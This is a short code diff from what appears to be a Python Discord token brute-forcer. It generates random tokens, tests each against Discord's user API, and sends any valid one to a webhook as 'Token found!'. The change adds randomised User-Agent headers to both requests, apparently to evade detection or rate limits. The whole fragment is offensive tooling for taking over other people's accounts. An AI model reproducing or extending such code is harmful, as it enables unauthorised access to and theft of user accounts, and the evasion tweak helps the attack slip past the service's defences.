@@ -32,7 +32,7 @@ try:
             'username': username_webhook,
             'avatar_url': avatar_webhook
         }
-        requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
+        requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json', 'User-Agent': RandomUserAgents()})
 
     def TokenCheck():
         TOKEN_CHARS = string.ascii_letters + string.digits + '-_'
@@ -42,7 +42,7 @@ try:
         token       = f"{first_part}.{second_part}.{third_part}"
 
         try:
-            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
+            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token, 'User-Agent': RandomUserAgents()})
             if response.status_code == 200:
                 embed_content = {
                     "title": "Token found!",
